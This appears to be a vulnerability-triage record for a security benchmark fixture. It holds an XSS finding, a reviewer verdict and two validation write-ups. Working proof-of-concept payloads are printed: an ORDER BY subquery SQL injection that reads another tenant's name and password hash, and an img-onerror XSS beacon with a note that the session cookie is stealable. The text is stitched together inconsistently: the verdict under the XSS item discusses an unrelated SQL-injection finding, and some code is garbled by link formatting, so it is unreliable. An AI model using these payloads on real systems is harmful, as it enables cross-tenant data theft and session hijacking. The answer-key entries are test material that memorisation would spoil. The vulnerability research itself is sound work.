### #19 · saas-starter-kit · xss · scored class

**Proposed:** real · new: yes · confidence: high · reported by 4 configs (CxSec-Luna, CxSec-Sol, CxSec-Terra, Opus5-xhigh)

> Stored XSS: any account member can set their first/last name to HTML, and it runs in other members' and admins' browsers on /users because users.go:113 builds the HTML by hand and DataTables writes it with innerHTML.

- **Attacker source:** cmd/web-app/handlers/user.go:373-386 — POST /user/update (routes.go:181; any authenticated user, HasAuth). The user sets their own FirstName/LastName form fields, [req.ID](http://req.ID) is forced to claims.Subject, and the values are stored verbatim by internal/user/user.go:540-545. Validation is only 'omitempty' (internal/user/models.go:153-154).
- **Sink:** cmd/web-app/handlers/users.go:113 — v.Formatted = fmt.Sprintf("[%s](%s)", ..., v.Value) with the raw name. It is returned in the DataTables JSON (internal/platform/datatable/datatable.go:576-577) and written to the DOM with nTd.innerHTML (static/assets/vendor/datatables/jquery.dataTables.js:3115). Secondary sink: internal/platform/web/webcontext/flash_message.go:43-44 casts flash Title/Text to template.HTML, which base.gohtml:107-108 renders unescaped.
- **Evidence:** I traced the name from the self-service profile update (any role) into storage. The only control is CanModifyUser, which lets users edit themselves, and there is no character restriction or sanitiser (no html.EscapeString or bluemonday anywhere in cmd/ or internal/). Users.Index builds HTML by hand with fmt.Sprintf, so Go html/template auto-escaping never applies. The value travels as JSON, which decodes back to raw '<', and the vendored DataTables 1.10.19 writes cell data through innerHTML because no render function or $.fn.dataTable.render.text() is configured. /users is mounted in APP() (main.go:1051) and open to every member of the account, admins included. So a low-privilege member can plant a payload that runs in an admin's browser when the admin opens Users. The flash sink is a second independent proof: FlashMsg.Response turns the strings into template.HTML, which bypasses html/template escaping in the base layout.
- **Novelty:** The reference set for this fixture has command injection, open redirect, path traversal, SQLi, SSRF and SSTI (notification preview), and no XSS. This stored-XSS flow (user name to DataTables innerHTML, and to the template.HTML flash) shares no source or sink with any of them.
- **Second reviewer:** Holds: an ordinary account member's name is rendered as HTML for the account admin on /users.
- **Strongest counter-argument:** Victims are limited to members of the attacker's own account (tenant): a stranger who self-signs up reaches only their own account. That is still the standard case of a low-privilege member attacking the admin, so it does not justify a downgrade.
- **Your call:** ☐ agree · ☐ disagree → ______

My call: **agree** — real, new, high confidence. I verified the one point the agent flagged as uncertain (library behavior) directly against the pinned source.

**The sink is genuinely unescaped.** `go-sqlbuilder v1.4.1` is pinned in `go.mod`, and its `OrderBy` runs `EscapeAll`, which does only this:

```go

// Escape replaces `$` with `$$` in ident.

func Escape(ident string) string {

	return strings.Replace(ident, "$", "$$", -1)

}

```

That exists to protect the library's own `$`-placeholder syntax, not to sanitize SQL. Quotes, parentheses, subqueries, and keywords all pass through. So `query.OrderBy(req.Order...)` drops the raw user string into the `ORDER BY` clause. The agent's counter-argument ("behavior comes from knowledge, not the repo") is now resolved — I confirmed it from the exact tagged version.

**Both entry points reach that sink.**

- Web-API `order` param: `user.go:69-73` appends each raw comma-split token to `req.Order`, which flows to `user/user.go:189` `query.OrderBy(req.Order...)` and executes at `user/user.go:229`. `GET /v1/users` needs only `mid.AuthenticateHeader` `routes.go:86`), and a token is self-service: unauthenticated `POST /v1/signup` `routes.go:120`) then `POST /v1/oauth/token` `routes.go:96`, no middleware). The same source pattern repeats in `user_account.go:69` and `checklist.go:70`.
- Web-app DataTables `dir`: I traced it end to end — `datatable.go:204` stores `co.Dir` raw, `datatable.go:327/330` concatenates it via `fmt.Sprintf("%s %s", field, co.Dir)`, `datatable.go:440` joins into `sorting`, and `users.go:152` / `checklists.go:116` split it back into `req.Order` → same `OrderBy` sink. The column index is validated against `DisplayFields` `df.Field == ""` errors out), but the direction string is not. `GET /users` and `/checklists` need only session + `HasAuth` `routes.go:163/141`).

**It's new.** The only reference SQLi `...-sqli-checklist-search`) is the `Search` handler at `checklist.go:367-379`, which string-interpolates the `query` param in the handler itself. This finding is a different source, different file, and a different sink (the `go-sqlbuilder` `OrderBy` path). Distinct.

**Tenant bypass holds.** `applyClaimsSelect` constrains only the outer `WHERE id IN (...)`. An uncorrelated scalar subquery in `ORDER BY` (e.g. `(SELECT substring(password_hash ...) FROM users LIMIT 1)`) reads any table independent of that restriction, giving a boolean/error oracle — so blind cross-tenant extraction is real.

One caveat for whoever writes the POC: because `$` becomes `$$`, payloads must avoid `$` (no Postgres dollar-quoting, no `$1`). Standard quote`CASEsubstring()` oracles don't need it, so exploitability is unaffected.

I agree with the agent's scoping: issue this as **one verdict on the ORDER BY sink class** covering the web-API `order` flow and the DataTables `dir` flow, since they converge on the same sink. The deferrals are also right — flow (4) invite emails into `fmt.Sprintf` WHERE `invite.go:53-56`) is a separate sink that needs its own check, and flow (3) `where` via `ExtractWhereArgs` is borderline because it turns literals into bind names.

I could not run a live DB POC — there's no Go toolchain, module cache, vendor dir, or Postgres in this environment — so this verdict rests on static tracing plus the fetched library source rather than execution.

For the ground-truth entry (type `sql-injection`), I'd record two flows to the shared sink:

- source `cmd/web-api/handlers/user.go:69` → sink `internal/user/user.go:189`
- source `internal/platform/datatable/datatable.go:204` → sink `internal/user/user.go:189` (via `users.go:152`)

and note the sibling sinks of the same class: `user_account/user.go:105`, `user_account/user_account.go:121`, `checklist/checklist.go:113`, `account/account.go:170`, and `account_preference/account_preference.go:73,101`.

Validation by Grok:

**Exploitable.** The web-API `order` parameter is a real SQL injection. A safe list hides the other tenant; the injected `ORDER BY` reads that tenant's stored row and returns it in the error.

I brought the fixture up on loopback with its real database, not a stand-in.

| Dependency | What is running |

|---|---|

| Go | 1.21.13 from the official arm64 archive, under `~/.local/go`. `go.mod` asks for 1.13; this toolchain built `cmd/web-api` and `tools/schema`. |

| PostgreSQL | 17.11 (Debian). Fresh cluster in `/tmp/saas-pg`, `127.0.0.1:5433`, database `shared`. The packaged cluster on 5432 was left down. |

| Redis | 8.0.2, `127.0.0.1:6379`, data dir `/tmp/saas-redis`. |

| Web API | `127.0.0.1:3001`. `/ping` returns `pong`. `/v1/health` returns `{"status":"ok"}`. |

| Not required | MongoDB, queues, object storage, mail. With no AWS session the API uses the disabled mailer. Auth keys went to `/tmp/auth-private-keys`. |

Schema migrations completed, including the geonames load. Two accounts were created with `POST /v1/signup`, then bearer tokens with `POST /v1/oauth/token`. Those passwords are only in `/tmp/saas-poc-creds`.

**Control.** `GET /v1/users?order=email` with the attacker token returns **200** and one row, `attacker-poc@example.test`. `victim-excluded@example.test` is not in the body.

**Exploit.** The same call with this `order` value:

```text

(SELECT CAST(first_name AS int) FROM users WHERE email='victim-excluded@example.test')

```

returns **500**. The dev error is `invalid input syntax for type integer: "Victim"`. That first name never appears in the safe response. Casting `password_hash` the same way returns a bcrypt hash that was not in the request. The same cast against `nobody-not-in-db@example.test` returns **200**, so the error is a real row lookup, not an echo of the query text.

The tenant `WHERE` stays in place, so the victim is not added as another JSON user. The excluded row still comes back: its stored `first_name` and `password_hash` are in the SQL error. That is enough to read another account. Avoid `$` in payloads; `go-sqlbuilder` v1.4.1 only doubles `$`, and the hash above was read from Postgres, not sent in the query.

The web-app DataTables `dir` path was not executed. Only `web-api` is running. The proven sink is `GET /v1/users` through `query.OrderBy`.

Validated by Grok:

**Exploitable.** A member with role `user` stored HTML in their own name, and that HTML ran in an admin's browser and in another member's browser when they opened `/users`.

The web app is the fixture binary, built with Go 1.21.13 and bound to `127.0.0.1:3000`. `/ping` returns `pong` and `/v1/health` returns `{"status":"ok"}`. It uses the existing PostgreSQL 17 database `shared` on `127.0.0.1:5433` and Redis 8.0.2 on `127.0.0.1:6379`, database 1. Mail, MongoDB, queues, and object storage are not on this path. Accounts were created through the running app. Passwords are only in `/tmp/saas-xss-creds`.

**Source.** `POST /user/update` `cmd/web-app/handlers/routes.go:181`, `HasAuth`) decodes `FirstName` and `LastName` at `cmd/web-app/handlers/user.go:373-386`, forces `req.ID` to the caller's id, and stores both strings at `internal/user/user.go:540-545`. The only validator is `omitempty` `internal/user/models.go:153-154`). The attacker row in Postgres is role `{user}`.

**Sink.** The users query builds the display name with `concat(first_name, ' ', last_name)` `internal/user_account/user.go:64`). `cmd/web-app/handlers/users.go:113` wraps that string in an anchor:

```go

v.Formatted = fmt.Sprintf("<a href='%s'>%s</a>", urlUsersView([q.ID](http://q.ID)), v.Value)

```

`internal/platform/datatable/datatable.go:576-577` returns `Formatted` in the DataTables JSON. The page loads `jquery.dataTables.min.js`, which assigns the cell with `innerHTML`, the same write as `jquery.dataTables.js:3115`. `/users` requires `HasAuth`, so every member of the account loads it, including admins `routes.go:163`).

**Control.** The admin DataTables JSON contained this cell for the benign member, and Chrome rendered it as text. It created no image and made no request to the marker server:

```html

<a href='/users/b2fee185-00a3-4645-a4c5-080f2f287451'>Benign Control</a>

```

A logged-in user from a different account received one row, their own name. The payload was not in that response. The same stored name on `/users/{id}` is escaped by the Go template: `<img src=x onerror=...>`.

**Exploit.** The member posted this profile update:

```text

FirstName=<img src=x onerror="fetch('//127.0.0.1:18099/m')">

LastName=z

```

The admin JSON cell came back as:

```html

<a href='/users/4175fd4b-493a-4ecb-bbaa-6e58643f48c9'><img src=x onerror="fetch('//127.0.0.1:18099/m')"> z</a>

```

In Chrome 151, signed in as the admin, `/users` parsed that image and the marker server recorded `GET /m`. The same page, opened by the other role`user` member, recorded `GET /m` again. DataTables draws the row twice, so each visit produced two hits. The session cookie is `web-app-session` with `Path=/` and no `HttpOnly`, so that script can also read it.

The flash `template.HTML` cast is a separate unescaped renderer. This update does not reach it: the flash text is the fixed string "Profile Updated". There is no existing XSS entry in this fixture's answer key. For the ground-truth entry, type `xss`: source `cmd/web-app/handlers/user.go:384`, sink `cmd/web-app/handlers/users.go:113`.